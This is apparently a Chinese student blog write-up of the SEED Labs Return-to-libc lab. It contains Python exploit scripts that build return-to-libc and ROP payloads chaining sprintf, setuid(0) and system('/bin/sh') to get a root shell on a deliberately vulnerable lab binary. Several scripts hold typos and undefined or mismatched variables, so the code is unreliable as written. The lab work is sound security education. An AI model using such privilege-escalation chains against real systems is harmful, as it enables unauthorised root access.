---
layout: post
title:  "【SEED Labs】Return-to-libc Attack and ROP"
date:   2021-07-14 00:00:00 +0800
categories: 实验
tags: SEEDLab 安全
comments: 1
mathjax: true
copyrights: 原创
---

本文为 [SEED Labs 2.0 - Return-to-libc Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/) 的实验记录。

# 实验原理

<img src="https://i.loli.net/2021/07/14/Vzj3RKYhni9FEuo.png" alt="img" style="zoom: 67%;" />

# Task 1: Finding out the Addresses of libc Functions

关闭地址随机化

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

修改链接

```bash
$ sudo ln -sf /bin/zsh /bin/sh
```

使用 gdb调试

```shell
$ touch badfile
$ make
$ gdb -q retlib
gdb-peda$ break main
gdb-peda$ run
gdb-peda$ p system
gdb-peda$ p exit
gdb-peda$ quit
```

得到结果

<img src="https://i.loli.net/2021/07/14/GePwFUSLofaqIcX.png" alt="image-20210713150033546" style="zoom:50%;" />

# Task 2: Putting the shell string in the memory

新建 MYSHELL 环境变量

<img src="https://i.loli.net/2021/07/14/Qj5dfxiZsLnaPY7.png" alt="image-20210713151640310" style="zoom:50%;" />

编写程序 `prtenv.c`

```c
#include<stdlib.h>
#include<stdio.h>

void main(){
	char* shell = getenv("MYSHELL");
	if (shell)
	printf("%x\n", (unsigned int)shell);
}
```

编译并运行。然后把上面的程序段加进 retlib.c 再次编译运行。

由于 prtenv 和 retlib 都是 6 个字母，所以会得到同样的结果，如下所示。

<img src="https://i.loli.net/2021/07/14/62c1hWbSXFRMeOo.png" alt="image-20210713152415930" style="zoom:50%;" />

# Task 3: Launching the Attack

根据前面得到的结果，将程序改为

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = Y+8
sh_addr = 0xffffd403 # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 28
system_addr = 0xf4e12420 # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = Y+4
exit_addr = 0xf7e04f80 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
f.write(content)
```

其中，Y 的值为 `0xffffcd78`$-$`0xffffcd60`$+4$

运行，攻击成功

<img src="https://i.loli.net/2021/07/14/dAs5V9c7vYnq42k.png" alt="image-20210713163255852" style="zoom:50%;" />

>  **Attack variation 1:** Is the `exit()` function really necessary? Please try your attack without including
> the address of this function in badfile. Run your attack again, report and explain your observations.

根据 task 要求，我们将 exploit.py 中 exit 的部分注释掉，然后重新运行。

<img src="https://i.loli.net/2021/07/14/ChIZ95NXdQeomSA.png" alt="image-20210713164335438" style="zoom:50%;" />

发现可以正常提权，但退出时会崩溃。

> **Attack variation 2:** After your attack is successful, change the file name of retlib to a different name,
> making sure that the length of the new file name is different. For example, you can change it to newretlib.
> Repeat the attack (without changing the content of badfile). Will your attack succeed or not? If it does
> not succeed, explain why.

根据 task 要求，我们先将编译后的二进制文件改名为 rrtlib，提权成功

<img src="https://i.loli.net/2021/07/14/FlWpG8SdL9EVO5U.png" alt="image-20210713164933154" style="zoom:50%;" />

在改为 newretlib，提权不成功

<img src="https://i.loli.net/2021/07/14/spX1zv8Yc4dN93Q.png" alt="image-20210713165133449" style="zoom:50%;" />

由此可见，这与程序名的长度有关。

# Task 4: Defeat Shell’s countermeasure

改回链接

```bash
$ sudo ln -sf /bin/dash /bin/sh
```

为了使攻击更加方便，我们直接使用 ROP。首先获取所需要的 libc 函数地址

<img src="https://i.loli.net/2021/07/14/mFiaHNz8rPoGqUZ.png" alt="image-20210714042907866" style="zoom:50%;" />

然后 `disas bof` 获取 `bof()` 函数返回地址

<img src="https://i.loli.net/2021/07/14/S6yvmTG7nuCxLFX.png" alt="image-20210714043032853" style="zoom:50%;" />

同时我们还有 retlib 打印出的 `bof()` 函数 ebp 位置和 MYSHELL 地址，根据这些修改 exploit.py

```python
# !/usr/bin/python3
import sys

def tobytes (value):
    return (value).to_bytes(4, byteorder= 'little')

content bytearray(0xaa for i in range (24))

sh_addr = 0xffffd3e3
leaveret = 0x565562ce
sprintf_addr = 0xf7e20e40
setuid_addr = 0xf7e99e30
system_addr = 0xf7e12420
exit_addr = 0xf7e4f80
ebp_bof = 0xffffcd58

# setuid()'s 1st argument
sprintf_argl = ebp_bof + 12 + 5*0x20

# a byte that contains 0x00
sprintf_arg2 = sh_addr + len("/bin/sh")

# Use leaveret to return to the first sprintf()
ebp_next = ebp_bof + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20 - 2*4)

# sprintf(sprintf_argl, sprintf_arg2)
for i in range(4):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(sprintf_addr)
    content += tobytes(leaveret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    content += b'A' * (0x20 - 5*4)
    sprintf_argl += 1

# setuid(0)
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(setuid_addr)
content += tobytes(leaveret)
content += tobytes(0xFFFFFFFF)
content += b'A' * (0x20 - 4*4)

# system("/bin/sh")
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(system_addr)
content += tobytes(leaveret)
content += tobytes(sh_addr)
content += b'A' * (0x20 - 4*4)

# exit()
content += tobytes(0xFFFFFFFF)
content += tobytes(exit_addr)

# Write the content to a file
with open("badfile", "wb") as f:
    f.write (content)
```

在上面的程序中，有以下几点：

- 先调用 `setuid(0)` ，然后再调用 `system("/bin/sh")`，以绕过 countermeasure
- 由于参数的 0 无法复制，所以我们调用四次 `sprintf()` 来生成 0

运行程序，可以看到成功提权

<img src="https://i.loli.net/2021/07/14/wq9mP1fk34vJYNV.png" alt="image-20210714044535215" style="zoom:50%;" />

# Task 5: Return-Oriented Programming

由于我们上一个 Task 已经使用了 ROP，所以这一个 Task 只要稍作修改即可。

先获取 `foo()` 地址

<img src="https://i.loli.net/2021/07/14/N6RqhLve2fu47Qr.png" alt="image-20210714052533803" style="zoom:50%;" />

然后修改 exploit.py

```python
# !/usr/bin/python3
import sys

def tobytes (value):
    return (value).to_bytes(4, byteorder= 'little')

content bytearray(0xaa for i in range (24))

sh_addr = 0xffffd3e3
leaveret = 0x565562ce
sprintf_addr = 0xf7e20e40
setuid_addr = 0xf7e99e30
system_addr = 0xf7e12420
exit_addr = 0xf7e4f80
ebp_bof = 0xffffcd58
foo_addr = 0x565562d0 # CHANGED!

# setuid()'s 1st argument
sprintf_argl = ebp_bof + 12 + 5*0x20

# a byte that contains 0x00
sprintf_arg2 = sh_addr + len("/bin/sh")

# Use leaveret to return to the first sprintf()
ebp_next = ebp_bof + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20 - 2*4)

# sprintf(sprintf_argl, sprintf_arg2)
for i in range(4):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(sprintf_addr)
    content += tobytes(leaveret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    content += b'A' * (0x20 - 5*4)
    sprintf_argl += 1

# setuid(0)
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(setuid_addr)
content += tobytes(leaveret)
content += tobytes(0xFFFFFFFF)
content += b'A' * (0x20 - 4*4)

for i in range(10): # CHANGED!
    ebp += 0x20
    content += tobytes(ebp_next)
    content += tobytes(foo_addr)
    content += tobytes(leveret)
    content += b'A'*(0x20-3*4)

# system("/bin/sh")
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(system_addr)
content += tobytes(leaveret)
content += tobytes(sh_addr)
content += b'A' * (0x20 - 4*4)

# exit()
content += tobytes(0xFFFFFFFF)
content += tobytes(exit_addr)

# Write the content to a file
with open("badfile", "wb") as f:
    f.write (content)
```

运行程序，可以看到调用了 10 次 `foo()` ，并成功提权

<img src="https://i.loli.net/2021/07/14/kGs2PwHXYTzRQyu.png" alt="image-20210714052903073" style="zoom:50%;" />

# 实验总结

实验总体难度一般。Task1 - 3 依葫芦画瓢即可，没有难度；Task4 难度较大，但我大炮轰蚊子，直接用 ROP 解决了 0 如何输入的问题；由此一来，Task5 就很容易解决了。
